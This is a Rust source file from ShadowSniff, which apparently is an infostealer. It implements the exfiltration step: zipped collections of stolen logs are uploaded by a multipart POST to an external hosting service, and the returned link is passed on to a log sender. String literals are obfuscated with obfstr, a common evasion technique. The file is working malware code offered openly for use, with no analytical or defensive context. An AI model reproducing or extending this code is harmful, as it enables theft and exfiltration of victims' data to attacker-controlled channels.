/*
 * This file is part of ShadowSniff (https://github.com/sqlerrorthing/ShadowSniff)
 *
 * MIT License
 *
 * Copyright (c) 2025 sqlerrorthing
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

use crate::{ExternalLink, LogContent, LogFile, LogSender, SendError};
use alloc::sync::Arc;
use collector::Collector;
use derive_new::new;
use obfstr::obfstr as s;
use requests::{BodyRequestBuilder, MultipartBuilder, Request, RequestBuilder, Response};

/// A wrapper around a [`LogSender`] that intercepts logs containing
/// internal zip archives and uploads them using a provided upload function.
///
/// If the log file's content is an internal zip archive ([`LogContent::ZipArchive`]),
/// [`Uploader`] will upload it via the `upload` function (a `fn(&str, &[u8]) -> Option<String>`),
/// which returns an external link as a `String`. Then, it replaces the log content with
/// an external link ([`LogContent::ExternalLink`]) before forwarding the modified log
/// to the inner [`LogSender`].
///
/// # Note
///
/// For log files that already contain an external link ([`LogContent::ExternalLink`]),
/// it simply delegates sending to the inner `LogSender` without modification.
#[derive(new, Clone)]
pub struct Uploader<T>
where
    T: LogSender,
{
    #[new(into)]
    service_name: Arc<str>,
    inner: T,
    upload: fn(&str, &[u8]) -> Option<Arc<str>>,
}

impl<T> LogSender for Uploader<T>
where
    T: LogSender,
{
    fn send<P, C>(
        &self,
        log_file: LogFile,
        password: Option<P>,
        collector: &C,
    ) -> Result<(), SendError>
    where
        P: AsRef<str> + Clone,
        C: Collector,
    {
        match &log_file.content {
            LogContent::ExternalLink(_) => self.inner.send(log_file, password, collector),
            LogContent::ZipArchive(archive) => {
                let size = archive.len();
                let external_link =
                    (self.upload)(&log_file.name, archive).ok_or(SendError::Network)?;
                let link = ExternalLink::new(self.service_name.clone(), external_link, size);

                self.inner.send(
                    log_file.change_content(LogContent::ExternalLink(link)),
                    password,
                    collector,
                )
            }
        }
    }
}

pub(crate) fn base_upload(name: &str, url: &str, bytes: &[u8]) -> Option<Response> {
    let mut builder = MultipartBuilder::new("----Multipart");
    builder.write_file_field(s!("file"), name, s!("application/zip"), bytes);

    let content_type = builder.content_type();
    let body = builder.finish();

    let response = Request::post(url)
        .header(s!("Content-Type"), &content_type)
        .body(body)
        .build()
        .send()
        .ok()?;

    Some(response)
}
